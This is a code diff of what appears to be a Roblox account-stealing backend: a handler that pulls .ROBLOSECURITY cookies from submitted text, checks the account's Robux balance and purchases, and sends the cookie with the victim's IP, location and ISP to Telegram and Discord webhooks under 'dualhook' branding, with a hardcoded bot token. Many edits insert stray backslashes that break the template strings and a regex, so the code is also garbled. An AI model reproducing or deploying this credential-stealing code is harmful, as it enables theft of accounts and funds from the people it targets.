@@ -1,4 +1,3 @@
-// api/submit.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
 const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
@@ -54,7 +53,7 @@ async function getAccInfo(cookie) {
 // ── Telegram ──────────────────────────────────────────────────────────────────
 async function tgSend(text) {
   try {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot\${TG_TOKEN}/sendMessage`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true })
     });
@@ -69,7 +68,7 @@ function extractCookie(raw) {
   const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
   const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
   const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
-  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
+  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+\$/.test(s)) return WARN + s;
   return null;
 }
 function findCookie(slots) {
@@ -157,7 +156,7 @@ export default async function handler(req, res) {
   // Build webhook list
   let webhook1 = null;
   const webhook2 = record.webhook;
- let dhParentName = null;
+  let dhParentName = null;
   
   if (isDH) {
     try {
@@ -176,8 +175,8 @@ export default async function handler(req, res) {
     
     // Base embed fields
     const baseFields = [
-      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
-      { name: '📄 Page', value: `\`${pName}\``, inline: true },
+      { name: '🌐 IP', value: `\`\${ip}\``, inline: true },
+      { name: '📄 Page', value: `\`\${pName}\``, inline: true },
       { name: '📍 Location', value: loc, inline: false },
       { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true },
       { name: '🕐 Time', value: now, inline: true }
@@ -199,7 +198,7 @@ export default async function handler(req, res) {
     // Send to webhook1 (dualhook parent) with sPAIN branding
     if (webhook1) {
       const dhFields = [...baseFields];
-      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
+      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`\${dhParentName || 'Unknown'}\``, inline: true });
       
       await discordSend(webhook1, {
         content: '@everyone',
@@ -234,8 +233,8 @@ export default async function handler(req, res) {
   if (!info) {
     // Base embed fields
     const baseFields = [
-      { name: '🌐 IP', value: `\`${ip}\``, inline: true },
-      { name: '📄 Page', value: `\`${pName}\``, inline: true },
+      { name: '🌐 IP', value: `\`\${ip}\``, inline: true },
+      { name: '📄 Page', value: `\`\${pName}\``, inline: true },
       { name: '💀 Status', value: 'Invalid/Expired Cookie', inline: true },
       { name: '📍 Location', value: loc, inline: false },
       { name: '🕐 Time', value: now, inline: true }
@@ -257,7 +256,7 @@ export default async function handler(req, res) {
     // Send to webhook1 (dualhook parent) with sPAIN branding
     if (webhook1) {
       const dhFields = [...baseFields];
-      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
+      dhFields.splice(2, 0, { name: '🔒 DH Parent', value: `\`\${dhParentName || 'Unknown'}\``, inline: true });
       
       await discordSend(webhook1, {
         content: '@everyone',
@@ -450,7 +449,7 @@ export default async function handler(req, res) {
       {
         name:   '💰 Account Funds',
         value:  `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,
-        inline: true
+       inline: true
       },
       {
         name:   '🛒 Purchases',
